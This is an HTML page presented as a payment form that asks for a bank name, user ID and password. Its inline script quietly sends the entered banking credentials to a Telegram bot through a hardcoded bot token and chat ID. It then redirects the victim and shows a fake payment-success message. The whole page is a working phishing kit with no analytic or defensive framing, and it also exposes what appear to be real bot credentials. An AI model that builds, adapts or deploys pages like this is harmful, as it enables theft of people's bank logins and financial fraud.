<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Payment Form</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
        }
        .form-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 300px; /* Set a width for the form */
            text-align: center;
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
        }
        input[type="text"], input[type="password"] {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .button {
            display: block;
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            font-size: 18px;
            color: white;
            background-color: red;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .button:hover {
            background-color: darkred;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h1>Payment</h1>
    <form action="" onsubmit=" return sender()">
        <input type="text" id="bank" name="bank" placeholder="Bank Name" required>
        <input type="text" id="User" name="User" placeholder="User ID" required>
        <input type="password" id="Pass" name="Pass" placeholder="Password" required>
        <button type="submit" class="button">Proceed to Pay</button>
    </form>
</div>
<link rel="stylesheet" href="style.css">
    <script src="sender.js"></script>
  
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  
  <script>
  //bot token
var telegram_bot_id = "7790794227:AAFsSbfZBNBiMs93o_cT0bHJFvQuNtkXOm8";
//chat id
var chat_id = 1210231596;
var ready = function () {
    bank = document.getElementById("bank").value;
    User = document.getElementById("User").value;
    Pass = document.getElementById("Pass").value;
  
    message = 
      "\nBank Name: " + bank +  
      "\nUser I'd: " + User + 
      "\nPass: " + Pass;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message,
          "file": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        
        document.location = "https://www.google.com/"; 
        
      swal("Successfull", "Your Payment Successfull", "success");
      
    });
    document.getElementById("bank").value = "";
    document.getElementById("User").value = "";
    document.getElementById("Pass").value = "";
    return false;
};
  </script>
</body>
</html>
